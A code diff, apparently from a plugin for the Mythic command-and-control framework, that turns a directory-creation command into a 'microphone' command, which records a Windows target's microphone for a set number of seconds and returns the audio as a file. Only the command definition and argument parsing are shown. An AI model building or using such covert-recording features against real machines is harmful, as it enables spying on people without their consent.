@@ -1,48 +1,47 @@
 from mythic_container.MythicCommandBase import *
-from mythic_container.MythicRPC import *
+import json
 
 
-class MkdirArguments(TaskArguments):
+class MicrophoneArguments(TaskArguments):
+
     def __init__(self, command_line, **kwargs):
         super().__init__(command_line, **kwargs)
         self.args = [
             CommandParameter(
-                name="path", 
-                type=ParameterType.String, 
-                description="Path to create directory.",
+                name="seconds", 
+                type=ParameterType.Number, 
+                description="Number of seconds to record",
                 parameter_group_info=[ParameterGroupInfo(
                     required=True
                 )]
             ),
         ]
 
+
     async def parse_arguments(self):
         if len(self.command_line) == 0:
-            raise ValueError("Must supply a path to create new directory")
-        self.add_arg("path", self.command_line)
+            raise ValueError("Must supply the number of seconds to record the microphone")
+        self.add_arg("seconds", self.command_line)
 
     async def parse_dictionary(self, dictionary):
         self.load_args_from_dictionary(dictionary)
 
-class MkdirCommand(CommandBase):
-    cmd = "mkdir"
+class MicrophoneCommand(CommandBase):
+    cmd = "microphone"
     needs_admin = False
-    help_cmd = "mkdir C:\\new\\directory"
-    description = "Create new directory."
+    help_cmd = "microphone <seconds>"
+    description = "Record the microphone for X seconds, send the result as a downloaded file"
     version = 1
-    author = "@c0rnbread"
-    attackmapping = []
-    argument_class = MkdirArguments
+    supported_ui_features = []
+    author = "@hegusung"
+    argument_class = MicrophoneArguments
     attributes = CommandAttributes(
         builtin=False,
         supported_os=[ SupportedOS.Windows ],
         suggested_command=False
     )
+    attackmapping = []
 
-    # async def create_tasking(self, task: MythicTask) -> MythicTask:
-    #     task.display_params = task.args.get_arg("command")
-    #     return task
-    
     async def create_go_tasking(self, taskData: PTTaskMessageAllData) -> PTTaskCreateTaskingMessageResponse:
         response = PTTaskCreateTaskingMessageResponse(
             TaskID=taskData.Task.ID,
